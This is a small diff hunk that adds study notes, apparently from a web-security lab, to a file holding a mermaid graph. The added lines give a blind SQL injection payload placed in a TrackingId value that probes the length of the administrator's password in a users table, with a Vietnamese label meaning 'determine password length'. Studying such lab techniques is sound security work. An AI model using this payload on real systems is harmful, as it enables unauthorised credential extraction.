@@ -103,7 +103,9 @@ graph TD
     G --> D;
     H --> F;
 
-
+BLIND SQLi
+Xác định độ dài password: TrackingId=u5YD3PapBcR4lN3e7Tj4' AND 
+(SELECT LENGTH(password) FROM users WHERE username='administrator') > 20--
 
 
 
